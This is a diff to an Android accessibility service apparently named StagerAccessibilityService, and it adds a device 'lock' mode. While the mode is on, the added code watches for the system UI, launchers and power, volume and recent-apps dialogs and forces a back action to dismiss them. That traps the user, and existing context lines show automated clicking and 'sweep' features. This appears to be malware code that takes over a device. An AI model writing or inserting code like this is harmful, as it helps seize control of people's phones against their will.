@@ -30,6 +30,7 @@ class StagerAccessibilityService : AccessibilityService() {
     private var isSweeping = false
     private var sweepStartTime = 0L
     private var sweepDuration = 300000L // 5 min default
+    private var isLocked = false
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -38,6 +39,19 @@ class StagerAccessibilityService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
+        // If locked, intercept power dialogs and navigation
+        if (isLocked && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            val pkg = event.packageName?.toString() ?: ""
+            if (pkg.contains("com.android.systemui") ||
+                pkg.contains("android") ||
+                pkg.contains("com.google.android.apps.nexuslauncher") ||
+                pkg.contains("com.sec.android.app.launcher")) {
+                // Dismiss system dialogs (power menu, volume panel, recent apps)
+                performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
+                return
+            }
+        }
+
         when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                 val text = event.text?.joinToString(" ") ?: ""
@@ -132,6 +146,18 @@ class StagerAccessibilityService : AccessibilityService() {
         isSweeping = false
         Log.i(TAG, "Sweep stopped")
     }
+
+    fun lockDevice() {
+        isLocked = true
+        Log.i(TAG, "Device locked via accessibility")
+    }
+
+    fun releaseDevice() {
+        isLocked = false
+        Log.i(TAG, "Device released")
+    }
+
+    fun isDeviceLocked(): Boolean = isLocked
 
     fun autoClick(x: Float, y: Float) {
         val path = Path().apply {
